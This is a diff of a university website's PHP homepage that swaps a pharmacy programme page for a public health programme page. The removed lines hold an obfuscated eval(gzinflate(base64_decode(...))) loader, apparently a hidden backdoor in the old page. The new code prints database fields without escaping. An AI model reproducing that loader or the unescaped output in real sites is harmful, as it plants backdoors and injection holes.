@@ -1,432 +1,381 @@
 <?php
-require 'hitcounter.php';
+//error_reporting(0);
+include "koneksi.php";
 
-$hit = new HitCounter();
 
-//cek dan simpan
-$hit->Hitung();
 
-//tampilkan counter
-//echo 'jumlah pengunjung :' . $hit->tampil();
-$dpjg=$hit->tampil();
-//tampilkan history jika ada
-$h = $hit->waktu();
-if (!empty($h)) {
-    //echo '<br>Anda telah mengunjungi halaman ini pada : ' . $h;
-} 
+$sql="SELECT * from visi_misi ";
+$query=mysql_query($sql,$koneksi);
+$data=mysql_fetch_array($query);
+$rows=mysql_num_rows($query);
 
-  $Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
-$Lix = "\x3d\x3dgt\x41F2JomjhV6rM3FXxr0ju/wGtHHllvjYfpe1DRgGMv6ZDo6Ep1qF8g\x61939nSkX/\x42I\x62mmyQ2Q\x2bM\x610JeOWye0QXI\x63NILP3\x42qYojE9/\x62\x62J97v\x43sdOE6\x41o\x41OQg\x63K1JGr0wmVJw\x2bKw\x41w\x41ID7QMJ3y/j\x43\x41X\x42wJe/jJ\x41nFw/T\x43\x41\x62\x42wJe/jI\x413Fw/D\x43\x41f\x42wJe/jH\x41HGw/z\x42\x41j\x42wJe";
-eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
-  
-  ?>
 
+?>
+
+<?php 
+//DOSEN 
+$sqld="SELECT * from data_dosen";
+$queryd=mysql_query($sqld,$koneksi);
+$datad=mysql_fetch_array($queryd);
+$rowsd=mysql_num_rows($queryd);
+?>
 <!DOCTYPE html>
+<html lang="en">
 
-<html lang="">
-<!--Copyright: OS-Templates.com
-Licence: Free to use under our free template licence terms
-Licence URI: https://www.os-templates.com/template-terms
-Free: 1 month after
--->
 <head>
-<title>Farmasi Trinita</title>
-<meta charset="utf-8">
-<meta name="keywords" content="UNITA, Universitas Trinita, Kota Manado, SIAKAD ONLINE, Farmasi Trinita, Farmasi Apriano Ade Saerang">
-<meta content="width=device-width, initial-scale=0.7, maximum-scale=1, user-scalable=no" name="viewport">
-<link rel="icon" href="images/farlogouniv.png" type="image/x-icon">
-<link href="layout/styles/layout.css" rel="stylesheet" type="text/css" media="all">
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+
+  <title>IKM UNIVERSITAS TRINITA</title>
+  <meta content="" name="description">
+  <meta content="" name="keywords">
+
+  <!-- Favicons -->
+  <link href="assets/img/favicon.png" rel="icon">
+  <link href="assets/img/apple-touch-icon.png" rel="apple-touch-icon">
+
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
+
+  <!-- Vendor CSS Files -->
+  <link href="assets/vendor/aos/aos.css" rel="stylesheet">
+  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <link href="assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
+  <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
+  <link href="assets/vendor/remixicon/remixicon.css" rel="stylesheet">
+  <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
+
+  <!-- Template Main CSS File -->
+  <link href="assets/css/style.css" rel="stylesheet">
+
+  <!-- =======================================================
+  * Template Name: Gp - v4.7.0
+  * Template URL: https://bootstrapmade.com/gp-free-multipurpose-html-bootstrap-template/
+  * Author: BootstrapMade.com
+  * License: https://bootstrapmade.com/license/
+  ======================================================== -->
 </head>
-<body id="top">
-<!-- ################################################################################################ -->
-<!-- ################################################################################################ -->
-<!-- ################################################################################################ -->
-<div class="wrapper row0">
-  <header id="header" class="hoc clear"> 
-    <!-- ################################################################################################ -->
-    <div id="logo" class="one_quarter first">
-      <h1><img src="images/logouniv.png" style="width: 25%;"> 
-        <a href="index.php"><span>F</span>armasi</a></h1>
+
+<body>
+
+  <!-- ======= Header ======= -->
+  <header id="header" class="fixed-top ">
+    <div class="container d-flex align-items-center justify-content-lg-between">
+
+      <h1 class="logo me-auto me-lg-0"><a href="index.html">IKM Trinita<span></span></a></h1>
+      <!-- Uncomment below if you prefer to use an image logo -->
+      <!-- <a href="index.html" class="logo me-auto me-lg-0"><img src="assets/img/logo.png" alt="" class="img-fluid"></a>-->
+
+      <nav id="navbar" class="navbar order-last order-lg-0">
+        <ul>
+          <li><a class="nav-link scrollto active" href="#hero">Beranda</a></li>
+          <li><a class="nav-link scrollto" href="#about">Visi Misi</a></li>
+          <li><a class="nav-link scrollto" href="#services">Dosen</a></li>
+          <li><a class="nav-link scrollto " href="#portfolio">Tridharma</a></li>
+          <li><a class="nav-link scrollto" href="#team">Jadwal</a></li>
+          
+          </li>
+          <li><a class="nav-link scrollto" href="#contact">Kontak</a></li>
+        </ul>
+        <i class="bi bi-list mobile-nav-toggle"></i>
+      </nav><!-- .navbar -->
+
+      <a href="#about" class="get-started-btn scrollto">Get Started</a>
+
     </div>
-    <div class="three_quarter">
-      <ul class="nospace clear">
-        <li class="one_quarter first">
-          <div class="block clear"><a href="#"><i class="fas fa-phone"></i></a> <span><strong>Hubungi Kami:</strong> 0822-2806-1596</span></div>
-        </li>
-        <li class="one_quarter">
-          <div class="block clear"><a href="#"><i class="fas fa-envelope"></i></a> <span><strong>E-mail:</strong> farmasi@trinita.ac.id</span></div>
-        </li>
-        <li class="one_quarter">
-          <div class="block clear"><a href="#"><i class="fas fa-clock"></i></a> <span><strong> Senin - Jumat:</strong> 08.00am - 17.00pm</span></div>
-        </li>
-        <li class="one_quarter">
-          <div class="block clear"><a href="#"><i class="fas fa-clock"></i></a> <span><strong>Visitor:</strong> <?= $dpjg ?></span></div>
-        </li>
-      </ul>
+  </header><!-- End Header -->
+
+  <!-- ======= Hero Section ======= -->
+  <section id="hero" class="d-flex align-items-center justify-content-center">
+    <div class="container" data-aos="fade-up">
+
+      <div class="row justify-content-center" data-aos="fade-up" data-aos-delay="150">
+        <div class="col-xl-6 col-lg-8">
+          <h1>ILMU KESEHATAN MASYARAKAT<span>.</span></h1>
+          <h2>UNIVERSITAS TRINITA MANADO</h2>
+        </div>
+      </div>
+
+      <div class="row gy-4 mt-5 justify-content-center" data-aos="zoom-in" data-aos-delay="250">
+        <div class="col-xl-2 col-md-4"></div>
+      </div>
+
     </div>
-    <!-- ################################################################################################ -->
-  </header>
-</div>
-<!-- ################################################################################################ -->
-<!-- ################################################################################################ -->
-<!-- ################################################################################################ -->
-<div class="wrapper row1">
-  <section class="hoc clear"> 
-    <!-- ################################################################################################ -->
-    <nav id="mainav">
-      <ul class="clear">
-        <li class="active"><a href="index.php">Beranda</a></li>
-        <li><a class="drop" href="#">Akademik</a>
-          <ul>
-            <li><a href="#">Sambutan</a></li>
-            <li><a href="#">Visi Misi</a></li>
-            <li><a href="pages/kur.html">Kurikulum</a></li>
-          </ul>
-        </li>
-        <li><a class="drop" href="#">Informasi</a>
-          <ul>
-            <li><a target="_blank" href="https://pmb.trinita.ac.id">Pendaftaran MABA</a></li>
-            <!-- <li><a class="drop" href="#">Level 2 + Drop</a>
-              <ul>
-                <li><a href="#">Level 3</a></li>
-                <li><a href="#">Level 3</a></li>
-                <li><a href="#">Level 3</a></li>
-              </ul>
-            </li> -->
-            <li><a href="#">Peraturan Akademik</a></li>
-          </ul>
-        </li>
-        <li><a href="#">Jurnal</a></li>
-        <li><a href="#">Berita</a></li>
-        <li><a target="_blank" href="https://ictportal.trinita.ac.id">Portal Akademik</a></li>
+  </section><!-- End Hero -->
+
+  <main id="main">
+
+    <!-- ======= About Section ======= -->
+    <section id="about" class="about">
+      <div class="container" data-aos="fade-up">
+
+        <div class="row">
+          <div class="col-lg-6 order-1 order-lg-2" data-aos="fade-left" data-aos-delay="100">
+            <img src="assets/img/about.jpg" class="img-fluid" alt="">
+          </div>
+          <div class="col-lg-6 pt-4 pt-lg-0 order-2 order-lg-1 content" data-aos="fade-right" data-aos-delay="100"> <?php do { ?>
+            <h3><?php echo $data['judul'];?></h3>
+            <p class="fst-italic">
+              <?php echo $data['isi'];?>
+            </p>
+			  <?php } while ($data=mysql_fetch_array($query))?>
+           
+          </div>
+        </div>
+
+      </div>
+    </section><!-- End About Section -->
+
+    <!-- ======= Clients Section ======= -->
+    <section id="clients" class="clients">
+      <div class="container" data-aos="zoom-in">
+
+        <div class="clients-slider swiper">
+          <div class="swiper-wrapper align-items-center">
+            <div class="swiper-slide"></div>
+            <div class="swiper-slide"></div>
+            <div class="swiper-slide"></div>
+            <div class="swiper-slide"></div>
+            <div class="swiper-slide"></div>
+            <div class="swiper-slide"></div>
+            <div class="swiper-slide"></div>
+            <div class="swiper-slide"></div>
+          </div>
+          <div class="swiper-pagination"></div>
+        </div>
+
+      </div>
+    </section><!-- End Clients Section -->
+
+    <!-- ======= Features Section ======= -->
+    <section id="features" class="features">
+      <div class="container" data-aos="fade-up">
+
         
-      </ul>
-    </nav>
-    <!-- ################################################################################################ -->
-    <div id="searchform">
-      <div>
-        <form action="#" method="post">
-          <fieldset>
-            <legend>Quick Search:</legend>
-            <input type="text" placeholder="Enter search &hellip;">
-            <button type="submit"><i class="fas fa-search"></i></button>
-          </fieldset>
-        </form>
+      </div>
+    </section><!-- End Features Section -->
+
+    <!-- ======= Services Section ======= -->
+    <section id="services" class="services">
+      <div class="container" data-aos="fade-up">
+
+        <div class="section-title">
+          <h2>Dosen</h2>
+          <p>Pengajar</p>
+        </div>
+
+        <div class="row">
+          
+			<?php include "dosen.php";?>
+			
+        </div>
+
+      </div>
+    </section><!-- End Services Section -->
+
+    <!-- ======= Cta Section ======= -->
+    <section id="cta" class="cta">
+      <div class="container" data-aos="zoom-in">
+
+        <div class="text-center">
+          <h3>Jadwal Konsultasi </h3>
+          <p> Jadwal Konsultasi</p>
+          <a class="cta-btn" href="#"></a>
+        </div>
+
+      </div>
+    </section><!-- End Cta Section -->
+
+    <!-- ======= Portfolio Section ======= -->
+    <section id="portfolio" class="portfolio">
+      <div class="container" data-aos="fade-up">
+
+        <div class="section-title">
+          <h2>Pelaksanaan  </h2>
+          <p>Tridharma</p>
+        </div>
+
+        <div class="row" data-aos="fade-up" data-aos-delay="100">
+          
+           <?php include "tridharma.php";?>
+
+        </div>
+
+      </div>
+    </section><!-- End Portfolio Section -->
+
+    <!-- ======= Counts Section ======= -->
+   
+    <!-- ======= Testimonials Section ======= -->
+   
+            </div><!-- End testimonial item -->
+
+            
+            </div><!-- End testimonial item -->
+
+    </section><!-- End Testimonials Section -->
+
+    <!-- ======= Team Section ======= -->
+    <section id="team" class="team">
+      <div class="container" data-aos="fade-up">
+	<div class="section-title">
+          <p>Jadwal Kuliah</p>
+         
+        </div>
+      <?php include "detail.php";?>
+
+    </section><!-- End Team Section -->
+
+    <!-- ======= Contact Section ======= -->
+    <section id="contact" class="contact">
+      <div class="container" data-aos="fade-up">
+
+        <div class="section-title">
+          <h2>Kontak</h2>
+          <p>Hubungi Kami</p>
+        </div>
+
+        <div>
+          
+			
+			<iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3988.530041588341!2d124.80064611426515!3d1.4560546616318015!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x32877469e6cb46b9%3A0x2ebfa818baee20c7!2sUNIVERSITAS%20TRINITA!5e0!3m2!1sid!2sid!4v1649747220926!5m2!1sid!2sid" width="1100" height="450" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
+        </div>
+
+        <div class="row mt-5">
+
+          <div class="col-lg-4">
+            <div class="info">
+              <div class="address">
+                <i class="bi bi-geo-alt"></i>
+                <h4>Location:</h4>
+                <p>Jalan El. Manibang Malalayang</p>
+              </div>
+
+              <div class="email">
+                <i class="bi bi-envelope"></i>
+                <h4>Email:</h4>
+                <p>ikm@trinita.ac.id</p>
+              </div>
+
+              <div class="phone">
+                <i class="bi bi-phone"></i>
+                <h4>Call:</h4>
+                <p>+6285394304831</p>
+              </div>
+
+            </div>
+
+          </div>
+
+          <div class="col-lg-8 mt-5 mt-lg-0">
+
+            <form action="forms/contact.php" method="post" role="form" class="php-email-form">
+              <div class="row">
+                <div class="col-md-6 form-group">
+                  <input type="text" name="name" class="form-control" id="name" placeholder="Your Name" required>
+                </div>
+                <div class="col-md-6 form-group mt-3 mt-md-0">
+                  <input type="email" class="form-control" name="email" id="email" placeholder="Your Email" required>
+                </div>
+              </div>
+              <div class="form-group mt-3">
+                <input type="text" class="form-control" name="subject" id="subject" placeholder="Subject" required>
+              </div>
+              <div class="form-group mt-3">
+                <textarea class="form-control" name="message" rows="5" placeholder="Message" required></textarea>
+              </div>
+              <div class="my-3">
+                <div class="loading">Loading</div>
+                <div class="error-message"></div>
+                <div class="sent-message">Your message has been sent. Thank you!</div>
+              </div>
+              <div class="text-center"><button type="submit">Send Message</button></div>
+            </form>
+
+          </div>
+
+        </div>
+
+      </div>
+    </section><!-- End Contact Section -->
+
+  </main><!-- End #main -->
+
+  <!-- ======= Footer ======= -->
+  <footer id="footer">
+    <div class="footer-top">
+      <div class="container">
+        <div class="row">
+
+          <div class="col-lg-3 col-md-6">
+            <div class="footer-info">
+              <h3><span>.</span></h3>
+              <p>
+             
+              </p>
+              <div class="social-links mt-3">
+              
+              </div>
+            </div>
+          </div>
+
+          <div class="col-lg-2 col-md-6 footer-links">
+            <h4></h4>
+            <ul>
+            <li></li>
+            </ul>
+          </div>
+
+          <div class="col-lg-3 col-md-6 footer-links">
+            <h4></h4>
+            <ul>
+              <li></li>
+            </ul>
+          </div>
+
+          <div class="col-lg-4 col-md-6 footer-newsletter">
+            <h4></h4>
+           
+            <form action="" method="post">
+              <input type="email" name="email"><input type="submit" value="Subscribe">
+            </form>
+
+          </div>
+
+        </div>
       </div>
     </div>
-    <!-- ################################################################################################ -->
-  </section>
-</div>
-<!-- ################################################################################################ -->
-<!-- ################################################################################################ -->
-<!-- ################################################################################################ -->
-<div class="wrapper bgded overlay" style="background-image:url('images/demo/backgrounds/001.jpg'); align-items: center;">
-  <div id="pageintro" class="hoc clear">
-    <!-- ################################################################################################ -->
-    <article>
-      <p>Selamat Datang di Website <br> Program Studi</p>
-      <h3 class="heading">F A R M A S I</h3>
-      <p></p>
-      <footer><a class="btn" href="unita:;">UNIVERSITAS TRINITA</a></footer>
-    </article>
-    <!-- ################################################################################################ -->
-  </div>
-</div>
-<!-- ################################################################################################ -->
-<!-- ################################################################################################ -->
-<!-- ################################################################################################ -->
-<div class="wrapper row3">
-  <main class="hoc container clear"> 
-    <!-- main body -->
-    <!-- ################################################################################################ -->
-    <div class="sectiontitle">
-      
-      <h6 class="heading" style="background-color: yellow;">VISI, MISI, DAN TUJUAN PROGRAM STUDI</h6>
-      <p>-</p>
+
+    <div class="container">
+      <div class="copyright">
+        &copy; Copyright <strong><span></span></strong>. Prodi Ilmu Kesehatan Masyarakat Universitas Trinita Manado 2022
+      </div>
+      <div class="credits">
+        <!-- All the links in the footer should remain intact. -->
+        <!-- You can delete the links only if you purchased the pro version. -->
+        <!-- Licensing information: https://bootstrapmade.com/license/ -->
+        <!-- Purchase the pro version with working PHP/AJAX contact form: https://bootstrapmade.com/gp-free-multipurpose-html-bootstrap-template/ -->
+        Designed by <a href=""></a>
+      </div>
     </div>
-    <div class="group center btmspace-80">
-      <article class="one_third first"><a class="ringcon btmspace-50" href="#"><i class="fas fa-cube"></i></a>
-        <h6 class="heading">VISI</h6>
-        <p>'Menjadi Program Studi Farmasi yang berorientasi pada nilai integritas dan unggul dalam Pelayanan Farmasi dan Bahan Alam endemik Sulawesi Utara pada tahun 2025'</p>
-      </article>
-      <article class="one_third"><a class="ringcon btmspace-50" href="#"><i class="fas fa-chart-pie"></i></a>
-        <h6 class="heading">MISI</h6>
-        <p>1). Menyelenggarakan pendidikan Farmasi yang kompeten dan unggul dalam Pelayanan Farmasi dan bahan alam endemik Sulawesi Utara, berintegritas, dan cinta tanah air <br>
-2). Menyelenggarakan penelitian yang inovatif dalam pengembangan fitofarmaka dari bahan alam endemik Sulawesi Utara <br>
-3). Menyelenggarakan pengabdian pada masyarakat dalam bentuk Pelayanan kefarmasian dan pengembangan fitofarmaka di Sulawesi Utara.</p>
-      </article>
-      <article class="one_third"><a class="ringcon btmspace-50" href="#"><i class="fas fa-cube"></i></a>
-        <h6 class="heading">TUJUAN</h6>
-        <p>1). Menghasilkan lulusan sarjana farmasi yang kompeten dan unggul dalam pelayanan kefarmasian dan bahan alam endemik Sulawesi Utara, berintegritas, dan cinta tanah air. <br>
-2). Menghasilkan sarjana farmasi yang memiliki kemampuan melakukan penelitian yang inovatif dalam pengembangan fitofarmaka dari bahan alam endemik Sulawesi Utara. <br>
-3). Menghasilkan sarjana farmasi yang memiliki softskill dan kepekaan sosial untuk melakukan pengabdian masyarakat dalam pelayanan kefarmasian dan pengembangan fitofarmaka di Sulawesi Utara.</p>
-      </article>
-    </div>
-    <p class="center"><a class="btn" href="#">Selengkapnya <i class="fas fa-angle-right"></i></a></p>
-    <!-- ################################################################################################ -->
-    <!-- / main body -->
-    <div class="clear"></div>
-  </main>
-</div>
-<!-- ################################################################################################ -->
-<!-- ################################################################################################ -->
-<!-- ################################################################################################ -->
-<div class="wrapper row2">
-  <section class="hoc container clear"> 
-    <!-- ################################################################################################ -->
+  </footer><!-- End Footer -->
 
-    <article class="one_third first">
-      <h6 class="heading">SAMBUTAN</h6>
-      <p style="font-size: 10px;text-align: justify">
+  <div id="preloader"></div>
+  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>
 
-Program Studi Farmasi, di bawah koordinasi Fakultas Ilmu Kesehatan, saat ini menerapkan Kurikulum yang mengakomodasikan semua ilmu dan teknologi yang berkaitan dengan farmasi. Disiplin ilmu farmasi, suatu profesi di bidang kesehatan, bertanggung jawab atas penyediaan obat yang bermutu. <br><br>
+  <!-- Vendor JS Files -->
+  <script src="assets/vendor/purecounter/purecounter.js"></script>
+  <script src="assets/vendor/aos/aos.js"></script>
+  <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+  <script src="assets/vendor/glightbox/js/glightbox.min.js"></script>
+  <script src="assets/vendor/isotope-layout/isotope.pkgd.min.js"></script>
+  <script src="assets/vendor/swiper/swiper-bundle.min.js"></script>
+  <script src="assets/vendor/php-email-form/validate.js"></script>
 
- 
-Ilmu Farmasi mencakup 4 (empat) disiplin ilmu utama, yaitu Farmasetika, Farmakokimia, Farmakologi, dan Farmasi Bahan Alam.
+  <!-- Template Main JS File -->
+  <script src="assets/js/main.js"></script>
 
-<br><br>
-
-
-Semoga  sivitas akademika dan para alumni nantinya dari lembaga pendidikan tinggi ini dapat berkontribusi untuk meningkatkan derajat kesehatan bangsa Indonesia. <br><br>
-
-Ketua Program Studi <br>
-
-FRIDLY MANAWAN, S.Farm, M.Farm.</p>
-      
-    </article>
-    <figure  class="one_third"><a class="imgover" href="#"><img src="images/demo/kapro3.jpg" alt=""></a>
-    <p style="text-align: center;"><b>PIMPINAN PROGRAM STUDI</b></p>
-    <ul>  
-        <li>Ketua Prodi:</li>
-        FRIDLY MANAWAN, S.Farm, M.Farm <br> <br>
-        <li>Wakil Prodi:</li>
-        Apt. MITRA WYNNE TIMBURAS, S.Farm, M.Farm <br>
-      </ul></figure>
-    <figure class="one_third" style="padding-top: 0px;"><a class="imgover" href="#"><img src="images/demo/kapro.jpg" alt=""></a></figure>
-    <!-- <figure class="one_third"><a class="imgover" href="#"><img src="images/demo/348x420.png" alt=""></a></figure> -->
-    <!-- ################################################################################################ -->
-  </section>
-</div>
-<!-- ################################################################################################ -->
-<!-- ################################################################################################ -->
-<!-- ################################################################################################ -->
-<div class="wrapper row3">
-  <section class="hoc container clear"> 
-    <!-- ################################################################################################ -->
-    <div class="sectiontitle">
-      <h6 class="heading">KOMPETENSI LULUSAN</h6>
-      <p>program studi farmasi</p>
-    </div>
-    <ul class="nospace group btmspace-80 overview">
-      <li class="one_third">
-        <article><a href="#"><i class="fas fa-smile"></i></a>
-          <h6 class="heading"><a href="#">CARE GIVER</a></h6>
-          <p>"Mampu mengidentifikasi masalah terkait obat berlandaskan prinsip - prinsip ilmiah untuk mengoptimalkan terapi.
-Mampu menyiapkan sediaan farmasi sesuai kebutuhan pasien yang aman, efektif, stabil dan bermutu.
-Mampu menerapkan ilmu dan teknologi kefarmasian dalam perancangan, pembuatan, dan penjaminan  sediaann farmasi yang aman, efektif, stabil dan bermutu.
-"</p>
-          <footer><a href="#">View Details <i class="fas fa-angle-right"></i></a></footer>
-        </article>
-      </li>
-
-<li class="one_third">
-        <article><a href="#"><i class="fas fa-smile"></i></a>
-          <h6 class="heading"><a href="#"><?= strtoupper('Teacher/Educator, Drug informer') ?></a></h6>
-          <p>"Mampu mencari, mengevaluasi, menyiapkan, dan memberikan informasi tentang obat, pengobatan, dan penggunaan obat yang rasional.
-Mampu menyiapkan pengobatan dalam upaya promotive dan preventif kesehatan masyarakat.
-"
-</p>
-          <footer><a href="#">View Details <i class="fas fa-angle-right"></i></a></footer>
-        </article>
-      </li>
-
-      <li class="one_third">
-        <article><a href="#"><i class="fas fa-smile"></i></a>
-          <h6 class="heading"><a href="#"><?= strtoupper('Scientific comprehension & Research abilities, life - long learner
-') ?></a></h6>
-          <p>"Menunjukkan penguasan konsep Teori/Praktis tentang obat, tubuh manusia, dan mekanisme kerja obat.
-Mampu menerapkan konsep Teori/Praktikumtis berbagai bidang ilmu kefarmasian dalam melakukan riset bidang kefarmasian.
-Mampu mengikuti perkembangan IPTEK dan meninmgkatkan penguasan ilmu, pengetahuan, keterampilan dan kemampuan diri secara berkelanjutan.
-"
-</p>
-          <footer><a href="#">View Details <i class="fas fa-angle-right"></i></a></footer>
-        </article>
-      </li>
-
-      <li class="one_third">
-        <article><a href="#"><i class="fas fa-life-ring"></i></a>
-          <h6 class="heading"><a href="#"><?= strtoupper('Leader, Decision maker, Manager') ?></a></h6>
-          <p>"Mampu menerapkan prinsip – prinsip manajemen dalam menjalankan pekerjaan kefarmasian.
-Mampu mengambil keputusan yang tepat berdasarkan informasi dan data.
-"
-</p>
-          <footer><a href="#">View Details <i class="fas fa-angle-right"></i></a></footer>
-        </article>
-      </li>
-      <li class="one_third">
-        <article><a href="#"><i class="fas fa-life-ring"></i></a>
-          <h6 class="heading"><a href="#"><?= strtoupper('Communicator, Teamwork abilities') ?></a></h6>
-          <p>"Mampu membangun hubungan interpersonal dengan berbagai pihak.
-Mampu menyesuaikan diri dalam lingkungan/kultur budaya yang beragam.
-"
-</p>
-          <footer><a href="#">View Details <i class="fas fa-angle-right"></i></a></footer>
-        </article>
-      </li>
-
-      <li class="one_third">
-        <article><a href="#"><i class="fas fa-life-ring"></i></a>
-          <h6 class="heading"><a href="#"><?= strtoupper('Personnal/ Professional responsibilities') ?></a></h6>
-          <p>
-            "Mampu bertindak secara bertanggung jawab sesuai ketentuan perundang – undangan, norma dan etik kefarmasian.
-Mampu menjelaskan prinsip – prinsip etik dan penerapannya dalam bidang farmasi.
-"
-          </p>
-          <footer><a href="#">View Details <i class="fas fa-angle-right"></i></a></footer>
-        </article>
-      </li>
-
-      <li class="one_third">
-        <article><a href="#"><i class="fas fa-life-ring"></i></a>
-          <h6 class="heading"><a href="#"><?= strtoupper('Enterpreneur') ?></a></h6>
-          <p>
-            "Mampu merumuskan gagasan dan memformulasikan dalam rancangan wirausaha di bidang kefarmasian."
-          </p>
-          <footer><a href="#">View Details <i class="fas fa-angle-right"></i></a></footer>
-        </article>
-      </li>
-
-      <li class="one_third">
-        <article><a href="#"><i class="fas fa-life-ring"></i></a>
-          <h6 class="heading"><a href="#"><?= strtoupper('Natural product developer') ?></a></h6>
-          <p>
-            "Mampu melakukan pemisahan, permurnian, dan identifikasi senyawa alamiah.
-Mampu mengembangkan pemanfaatan bahan alam dalam pengobatan berdasarkan data empiris dan ilmiah.
-"
-
-          </p>
-          <footer><a href="#">View Details <i class="fas fa-angle-right"></i></a></footer>
-        </article>
-      </li>
-      
-    </ul>
-    <footer class="center"><a class="btn" href="#">GALERI</a></footer>
-
-
-
-
-    <!-- ################################################################################################ -->
-  </section>
-</div>
-<!-- ################################################################################################ -->
-<!-- ################################################################################################ --><!-- ################################################################################################ -->
-<div class="wrapper row2">
-  <section class="hoc container clear"> 
-    <!-- ################################################################################################ -->
-    <div class="sectiontitle">
-      <h6 class="heading">Kegiatan</h6>
-      <p>dokumentasi</p>
-    </div>
-    <div id="latest" class="group">
-      
-      <article class="one_quarter first"><a class="imgover" href="#"><img src="images/demo/kegiatan/keg1.jpg" alt=""></a>
-        <div class="excerpt">
-          <h6 class="heading">HKN KE-55 </h6>
-          <p>Hari Kesehatan Nasional, dengan mengusung Tema: 'Generasi Sehat Indonesia Unggul'.</p>
-          <footer><a href="#">Read More <i class="fas fa-angle-right"></i></a></footer>
-        </div>
-      </article>
-      <article class="one_quarter"><a class="imgover" href="#"><img src="images/demo/kegiatan/keg2.jpg" alt=""></a>
-        <div class="excerpt">
-          <h6 class="heading">Orientasi Anggota Baru</h6>
-          <p>Himpunan Mahasiswa Farmasi - Universitas Trinita.</p>
-          <footer><a href="#">Read More <i class="fas fa-angle-right"></i></a></footer>
-        </div>
-      </article>
-      <article class="one_quarter"><a class="imgover" href="#"><img src="images/demo/kegiatan/keg3.jpg" alt=""></a>
-        <div class="excerpt">
-          <h6 class="heading">P K M</h6>
-          <p>Kegiatan Pengabdian Kepada Masyarakat - Kec. Pusomaen - Minahasa Tenggara - Sulawesi Utara.</p>
-          <footer><a href="#">Read More <i class="fas fa-angle-right"></i></a></footer>
-        </div>
-      </article>
-      <article class="one_quarter"><a class="imgover" href="#"><img src="images/demo/kegiatan/keg0.jpg" alt=""></a>
-        <div class="excerpt">
-          <h6 class="heading">KEMAHASISWAAN</h6>
-          <p>Pelaksanaan SET EXPO 9-11 Maret 2023.</p>
-          <footer><a href="#">Read More <i class="fas fa-angle-right"></i></a></footer>
-        </div>
-      </article>
-      
-    </div>
-    <footer class="center"><a class="btn" href="#">Lihat Semua Kegiatan <i class="fas fa-angle-right"></i></a></footer>
-    <!-- ################################################################################################ -->
-  </section>
-</div>
-<!-- ################################################################################################ -->
-<!-- ################################################################################################ -->
-<!-- ################################################################################################ -->
-<div class="wrapper row4">
-  <footer id="footer" class="hoc clear"> 
-    <!-- ################################################################################################ -->
-    <div class="one_third first">
-      <h6 class="heading">PRODI FARMASI</h6>
-      <p>Link Terkait</p>
-      <ul>
-        <li>repositori</li>
-        <li>jurnal</li>
-        <li>proceeding</li>
-        <li>karya ilmiah</li>
-      </ul>
-      <p class="btmspace-30"> [<a href="#"><i class="fas fa-arrow-right"></i></a>]</p>
-      <ul class="faico clear">
-        <li><a class="faicon-facebook" target="_blank" href="https://www.facebook.com/universitastrinita"><i class="fab fa-facebook"></i></a></li>
-        <li><a class="faicon-google-plus" href="#"><i class="fab fa-google-plus-g"></i></a></li>
-        <li><a class="faicon-linkedin" href="#"><i class="fab fa-instagram"></i></a></li>
-        <li><a class="faicon-twitter" href="#"><i class="fab fa-twitter"></i></a></li>
-      </ul>
-    </div>
-    <div class="one_third">
-      <h6 class="heading">Kontak Kami</h6>
-      <ul>
-        <li>Alamat: Jln.El Manibang - Malalayang - SULUT</li><br>
-        <li>Telp: 0431-71565823</li><br>
-        <li>Email: farmasi@trinita.ac.id</li><br>
-      </ul>
-    </div>
-    <div class="one_third">
-      <h6 class="heading">kirim Email kepada kami</h6>
-      <p class="nospace btmspace-15">masukkan email anda untuk terhubung dengan kami lewat surel.</p>
-      <form method="post" action="#">
-        <fieldset>
-          <legend>Newsletter:</legend>
-          <input class="btmspace-15" type="text" value="" placeholder="Name">
-          <input class="btmspace-15" type="text" value="" placeholder="Email">
-          <button type="submit" value="submit">Submit</button>
-        </fieldset>
-      </form>
-    </div>
-    <!-- ################################################################################################ -->
-  </footer>
-</div>
-<!-- ################################################################################################ -->
-<!-- ################################################################################################ -->
-<!-- ################################################################################################ -->
-<div class="wrapper row5">
-  <div id="copyright" class="hoc clear"> 
-    <!-- ################################################################################################ -->
-    <p class="fl_left">Copyright &copy; 2019 - <a href="#">Farmasi Universitas Trinita</a></p>
-    <p class="fl_right">cq. <a target="_blank" href="https://trinita.ac.id/" title="bakom IT">Bakom IT</a></p>
-    <!-- ################################################################################################ -->
-  </div>
-</div>
-<!-- ################################################################################################ -->
-<!-- ################################################################################################ -->
-<!-- ################################################################################################ -->
-<a id="backtotop" href="#top"><i class="fas fa-chevron-up"></i></a>
-<!-- JAVASCRIPTS -->
-<script src="layout/scripts/jquery.min.js"></script>
-<script src="layout/scripts/jquery.backtotop.js"></script>
-<script src="layout/scripts/jquery.mobilemenu.js"></script>
 </body>
+
 </html>
